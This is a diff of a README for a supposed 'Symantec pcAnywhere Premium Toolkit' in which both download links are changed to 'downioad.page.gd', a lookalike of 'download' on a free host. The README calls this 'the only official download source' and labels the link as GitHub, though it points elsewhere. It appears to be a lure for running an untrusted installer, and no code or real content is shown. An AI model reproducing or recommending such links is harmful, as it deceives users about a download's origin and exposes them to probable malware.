@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive premium toolkit for Symantec pcAnywhere, aimed at enhancing remote desktop capabilities on modern Windows systems. Updated for 2026, it includes a variety of optimizations and additional features to ensure a seamless and efficient remote access experience. Whether for personal use or small-scale remote management, this toolkit offers valuable tools to improve your workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -85,6 +85,6 @@ A5: The toolkit itself does not require a separate license key, but you must hav
 
 To download the Symantec pcAnywhere Premium Toolkit, click the link below. This is the only official download source provided.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This README provides a complete overview of the toolkit, including installation, usage, and troubleshooting. By following the guidelines, users can enhance their Symantec pcAnywhere experience on Windows 10 and 11.
